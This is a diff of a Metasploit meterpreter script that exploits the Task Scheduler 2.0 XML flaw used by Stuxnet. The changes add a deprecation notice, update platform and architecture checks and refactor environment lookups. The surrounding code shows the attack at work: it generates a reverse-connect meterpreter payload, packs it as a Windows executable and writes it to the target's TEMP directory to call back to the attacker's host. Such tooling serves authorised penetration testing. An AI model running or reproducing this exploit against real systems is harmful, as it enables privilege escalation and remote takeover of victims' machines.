@@ -1,4 +1,12 @@
 ##
+# WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
+# If you'd like to imporve this script, please try to port it as a post
+# module instead. Thank you.
+##
+
+
+
+##
 #
 # This script exploits the Task Scheduler 2.0 XML 0day exploited by Stuxnet
 #
@@ -19,12 +27,17 @@ require 'zlib'
 #
 # Filter out sessions that this definitely won't work on.
 #
-if session.platform !~ /win32|win64|java/
+unless [ARCH_X64, ARCH_X86, ARCH_JAVA].include(session.arch)
+  print_error("#{session.arch} is not supported.")
+  raise Rex::Script::Completed
+end
+
+unless session.platform == 'windows'
   print_error("#{session.platform} is not supported.")
   raise Rex::Script::Completed
 end
 
-if session.sys.config.sysinfo["Architecture"] =~ /wow64/i
+if session.sys.config.sysinfo["Architecture"] == ARCH_X64 && session.arch == ARCH_X86
   #
   # WOW64 Filesystem Redirection prevents us opening the file directly. To make matters
   # worse, meterpreter/railgun creates things in a new thread, making it much more
@@ -81,7 +94,7 @@ upload_fn = nil
 
   when "-u"
     upload_fn = val
-    if not ::File.exists?(upload_fn)
+    if not ::File.exist?(upload_fn)
       raise "Specified file to upload does not exist!"
     end
 
@@ -99,6 +112,10 @@ upload_fn = nil
   end
 }
 
+envs = session.sys.config.getenvs('SystemRoot', 'TEMP')
+sysdir = envs['SystemRoot']
+tmpdir = envs['TEMP']
+
 # Must have at least one of -c or -u
 if not cmd and not upload_fn
   print_status("Using default reverse-connect meterpreter payload; -c or -u not specified")
@@ -110,9 +127,8 @@ if not cmd and not upload_fn
   raw  = pay.generate
   exe = Msf::Util::EXE.to_win32pe(client.framework, raw)
   #and placing it on the target in %TEMP%
-  tempdir = client.fs.file.expand_path("%TEMP%")
   tempexename = Rex::Text.rand_text_alpha(rand(8)+6)
-  cmd = tempdir + "\\" + tempexename + ".exe"
+  cmd = tmpdir + "\\" + tempexename + ".exe"
   print_status("Preparing connect back payload to host #{rhost} and port #{rport} at #{cmd}")
   fd = client.fs.file.new(cmd, "wb")
   fd.write(exe)
@@ -139,8 +155,6 @@ end
 #
 # Upload the payload command if needed
 #
-sysdir = session.fs.file.expand_path("%SystemRoot%")
-tmpdir = session.fs.file.expand_path("%TEMP%")
 if upload_fn
   begin
     location = tmpdir.dup
